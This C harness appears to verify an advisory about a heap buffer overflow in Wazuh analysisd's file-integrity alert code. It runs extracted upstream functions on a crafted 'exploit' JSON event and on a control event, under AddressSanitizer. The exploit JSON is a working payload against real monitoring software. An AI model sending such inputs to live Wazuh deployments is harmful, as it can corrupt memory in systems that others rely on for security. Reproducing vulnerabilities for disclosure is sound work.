/* Wazuh analysisd FIM alert sink harness.
 *
 * The function bodies below are extracted verbatim at build time from a
 * hash-pinned upstream syscheck.c tag (see run.sh / PROVENANCE.md). Only the
 * surrounding types, allocator macros and two helpers are stubbed; the
 * snprintf sink and its argument preparation are upstream bytes.
 *
 * Build: gcc -fsanitize=address -g -I src harness.c extracted.inc \
 *        -o build/harness-asan -l:libcjson.so.1
 */
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "cJSON.h"

/* Constants copied from pinned src/headers/defs.h (v4.14.7). */
#define OS_SIZE_32      32
#define OS_SIZE_256     256
#define OS_SIZE_65536   65536
#define OS_MAXSTR       OS_SIZE_65536
#define OS_FLSIZE       OS_SIZE_256

/* Pinned src/headers/syscheck_op.h, enum fim_fields. */
typedef enum fim_fields {
    FIM_FILE, FIM_HARD_LINKS, FIM_MODE, FIM_SIZE, FIM_SIZE_BEFORE,
    FIM_PERM, FIM_PERM_BEFORE, FIM_UID, FIM_UID_BEFORE,
    FIM_GID, FIM_GID_BEFORE, FIM_MD5, FIM_MD5_BEFORE,
    FIM_SHA1, FIM_SHA1_BEFORE, FIM_UNAME, FIM_UNAME_BEFORE,
    FIM_GNAME, FIM_GNAME_BEFORE, FIM_MTIME, FIM_MTIME_BEFORE,
    FIM_INODE, FIM_INODE_BEFORE, FIM_SHA256, FIM_SHA256_BEFORE,
    FIM_DIFF, FIM_ATTRS, FIM_ATTRS_BEFORE, FIM_CHFIELDS,
    FIM_USER_ID, FIM_USER_NAME, FIM_GROUP_ID, FIM_GROUP_NAME,
    FIM_PROC_NAME, FIM_PROC_PNAME, FIM_AUDIT_CWD, FIM_AUDIT_PCWD,
    FIM_AUDIT_ID, FIM_AUDIT_NAME,
#ifdef WZ_FIXED
    FIM_AUDIT_GID, FIM_AUDIT_GROUP_NAME,
#endif
    FIM_EFFECTIVE_UID, FIM_EFFECTIVE_NAME,
    FIM_PPID, FIM_PROC_ID, FIM_TAG, FIM_SYM_PATH, FIM_REGISTRY_ARCH,
    FIM_REGISTRY_VALUE_NAME, FIM_REGISTRY_VALUE_TYPE, FIM_REGISTRY_HASH,
    FIM_ENTRY_TYPE, FIM_EVENT_TYPE, FIM_NFIELDS
} fim_fields;

typedef enum syscheck_event_t { FIM_ADDED, FIM_MODIFIED, FIM_READDED, FIM_DELETED } syscheck_event_t;

typedef struct { char *key; char *value; } w_field_t;
typedef struct { char **fields; } w_decoder_t;
typedef struct {
    int nfields;
    w_field_t fields[FIM_NFIELDS];
    char *full_log;
    char *log;
    char *program_name;
    char *dec_timestamp;
    char agent_id[16];
    w_decoder_t *decoder_info;
} Eventinfo;

/* Minimal stand-ins for Wazuh helpers used by the extracted functions. */
#define os_strdup(x, y) do { (y) = strdup(x); if (!(y)) abort(); } while (0)
static int fim_generate_alert(Eventinfo *, syscheck_event_t, cJSON *, cJSON *, cJSON *);
size_t fim_generate_comment(char *, long, const char *, const char *, const char *);
int fim_fetch_attributes(cJSON *, cJSON *, Eventinfo *);
int fim_fetch_attributes_state(cJSON *, Eventinfo *, char);
#define os_malloc(sz, p) do { (p) = malloc(sz); if (!(p)) abort(); } while (0)
#define os_calloc(n, sz, p) do { (p) = calloc((n), (sz)); if (!(p)) abort(); } while (0)
#define mdebug1(...) ((void)0)
#define os_free(p) do { free(p); (p) = NULL; } while (0)
#define mdebug2(...) ((void)0)
#define merror(...) ((void)0)
#define w_strdup(x, y) os_strdup(x, y)

static char *w_long_str(long v) {
    char buf[64];
    snprintf(buf, sizeof(buf), "%ld", v);
    return strdup(buf);
}
static void wm_strcat(char **dest, const char *src, char sep) {
    size_t d = *dest ? strlen(*dest) : 0;
    size_t s = src ? strlen(src) : 0;
    char *p = realloc(*dest, d + s + (sep ? 1 : 0) + 1);
    if (!p) abort();
    *dest = p;
    if (sep) p[d++] = sep;
    if (s) memcpy(p + d, src, s);
    p[d + s] = '\0';
}
static char *perm_json_to_old_format(cJSON *perm_json) {
    (void)perm_json;
    return NULL; /* PoC uses a string "perm", not the object form. */
}

#include "extracted.inc"

/* Advisory PoC JSON: registry_value modification, no old_attributes. */
static const char *EXPLOIT_JSON =
    "{\"type\":\"event\",\"data\":{\"type\":\"modified\",\"path\":\"a\","
    "\"attributes\":{\"type\":\"registry_value\",\"size\":9e18,\"perm\":\"a\","
    "\"uid\":\"a\",\"gid\":\"a\",\"mtime\":9e18,\"inode\":9e18,"
    "\"hash_md5\":\"a\",\"hash_sha1\":\"a\",\"hash_sha256\":\"Q\","
    "\"attributes\":\"a\"}}}";

/* Control: same fields with full old_attributes, per the advisory. */
static const char *CONTROL_JSON =
    "{\"type\":\"event\",\"data\":{\"type\":\"modified\",\"path\":\"a\","
    "\"attributes\":{\"type\":\"registry_value\",\"size\":9e18,\"perm\":\"a\","
    "\"uid\":\"a\",\"gid\":\"a\",\"mtime\":9e18,\"inode\":9e18,"
    "\"hash_md5\":\"a\",\"hash_sha1\":\"a\",\"hash_sha256\":\"a\","
    "\"attributes\":\"a\"},"
    "\"old_attributes\":{\"type\":\"registry_value\",\"size\":9e18,\"perm\":\"a\","
    "\"uid\":\"a\",\"gid\":\"a\",\"mtime\":9e18,\"inode\":9e18,"
    "\"hash_md5\":\"a\",\"hash_sha1\":\"a\",\"hash_sha256\":\"a\","
    "\"attributes\":\"a\"}}}";

static void run_case(const char *mode, const char *json) {
    cJSON *event = cJSON_Parse(json);
    cJSON *data = cJSON_GetObjectItem(event, "data");
    cJSON *attributes = cJSON_GetObjectItem(data, "attributes");
    cJSON *old_attributes = cJSON_GetObjectItem(data, "old_attributes");
    cJSON *audit = cJSON_CreateArray();

    Eventinfo lf;
    memset(&lf, 0, sizeof(lf));
    strcpy(lf.agent_id, "001");
    static w_decoder_t decoder;
    static char *names[FIM_NFIELDS];
    for (int i = 0; i < FIM_NFIELDS; i++) names[i] = "x";
    decoder.fields = names;
    lf.decoder_info = &decoder;
    os_strdup("a", lf.fields[FIM_FILE].value);
    os_strdup("registry_value", lf.fields[FIM_ENTRY_TYPE].value);
    os_strdup("modified", lf.fields[FIM_EVENT_TYPE].value);
    os_strdup("[]", lf.fields[FIM_HARD_LINKS].value);
    if (!old_attributes) os_strdup("scheduled", lf.fields[FIM_MODE].value);

    /* cleanevent.c:59-62 (pinned): size from the input length. */
    size_t loglen = strlen(json) + 1;
    os_malloc((2 * loglen) + 1, lf.full_log);
    lf.log = lf.full_log;
#ifdef WZ_PLAIN
    char *neighbor = malloc(128);
    memset(neighbor, 'Z', 128);
#endif

    fprintf(stderr, "mode=%s input_len=%zu alloc=%zu\n", mode, strlen(json), 2 * loglen + 1);
    int rc = fim_generate_alert(&lf, FIM_MODIFIED, attributes, old_attributes, audit);
    fprintf(stderr, "mode=%s rc=%d output_len=%zu\n", mode, rc,
            lf.full_log ? strlen(lf.full_log) : 0);
    fflush(stderr);
#ifdef WZ_PLAIN
    fprintf(stderr, "mode=%s neighbor=%.128s\n", mode, neighbor);
    free(neighbor);
#endif

    cJSON_Delete(audit);
    cJSON_Delete(event);
    free(lf.full_log);
}

int main(int argc, char **argv) {
    if (argc != 2) return 2;
    if (strcmp(argv[1], "exploit") == 0) run_case("exploit", EXPLOIT_JSON);
    else if (strcmp(argv[1], "control") == 0) run_case("control", CONTROL_JSON);
    else return 2;
    return 0;
}
